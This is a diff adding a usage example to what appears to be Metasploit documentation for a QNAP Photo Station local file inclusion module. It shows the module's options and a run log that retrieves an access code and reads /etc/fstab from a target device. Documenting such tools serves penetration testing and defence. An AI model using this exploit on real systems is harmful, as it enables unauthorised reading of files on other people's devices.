@@ -147,4 +147,47 @@ This would return an `authSid`, that can be used with most endpoints that requir
 ### QNAP QTS 4.3.6 with Photo Station 5.7.9
 
 ```
+msf5 auxiliary(gather/qnap_lfi) > show options
+
+Module options (auxiliary/gather/qnap_lfi):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   DEPTH      3                yes       Traversal Depth (to reach the root folder)
+   FILEPATH   /etc/fstab       yes       The file to read on the target
+   PRINT      true             yes       Whether or not to print the content of the file
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS     192.168.250.5    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT      443              yes       The target port (TCP)
+   SSL        true             no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /                yes       The URI of the QNAP Website
+   VHOST                       no        HTTP server virtual host
+
+
+Auxiliary action:
+
+   Name      Description
+   ----      -----------
+   Download  Download the file at FILEPATH
+
+
+msf5 auxiliary(gather/qnap_lfi) > run
+[*] Running module against 192.168.250.5
+
+[*] Getting the Album Id
+[+] Got Album Id : cJinsP
+[*] Getting the Access Code
+[+] Got Access Code : MHwxfDE1OTE4MTk2NjY=
+[*] Attempting Local File Inclusion
+[+] File download successful, saved in /home/smcintyre/.msf4/loot/20200610160738_default_192.168.250.5_qnap.http_072626.txt
+[+] File content:
+# /etc/fstab: static file system information.
+#
+# <file system> <mount pt>     <type>	<options>         <dump> <pass>
+/dev/ram       /              ext2	defaults         1      1
+proc		/proc	       proc     defaults	  0	 0
+none            /dev/pts        devpts  gid=5,mode=620  0       0
+
+[*] Auxiliary module execution completed
+msf5 auxiliary(gather/qnap_lfi) >
 ```
